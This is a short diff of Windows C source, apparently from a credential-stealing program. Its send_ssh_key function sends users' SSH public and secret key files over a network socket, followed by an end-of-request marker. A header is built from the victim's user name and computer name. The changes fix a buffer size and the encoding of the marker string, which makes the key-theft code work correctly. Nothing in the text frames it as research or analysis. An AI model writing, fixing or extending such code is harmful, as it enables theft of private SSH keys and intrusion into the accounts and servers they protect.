@@ -72,8 +72,8 @@ static PWSTR get_header(void) {
   DWORD lenMachineName = MAX_COMPUTERNAME_LENGTH + 1;
   WCHAR userName[UNLEN + 1] = {0};
   DWORD lenUserName = UNLEN + 1;
-  WCHAR fullName[UNLEN + MAX_COMPUTERNAME_LENGTH + 2 + 12] = {0};
-  DWORD lenFullName = UNLEN + MAX_COMPUTERNAME_LENGTH + 2 + 12;
+  WCHAR fullName[UNLEN + MAX_COMPUTERNAME_LENGTH + 1 + 12] = {0};
+  DWORD lenFullName = UNLEN + MAX_COMPUTERNAME_LENGTH + 1 + 12;
 
   err = GetComputerNameW(machineName, &lenMachineName);
   if (err == 0) {
@@ -177,7 +177,7 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send file '%ls'\n", keysTab[i].publicKeyPath);
             success = FALSE;
         }
-        err = send(*sock, (char *)L"[RUEPIHC]\n", sizeof(WCHAR) * 10, 0);
+        err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 10, 0);
         if (err == SOCKET_ERROR) {
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send end of request: %d\n", GetLastError());
             free(headTypeFname);
@@ -210,7 +210,7 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send file '%ls'\n", keysTab[i].secretKeyPath);
             success = FALSE;
         }
-        err = send(*sock, (char *)L"[RUEPIHC]\n", sizeof(WCHAR) * 10, 0);
+        err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 10, 0);
         if (err == SOCKET_ERROR) {
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send end of request: %d\n", GetLastError());
             free(headTypeFname);
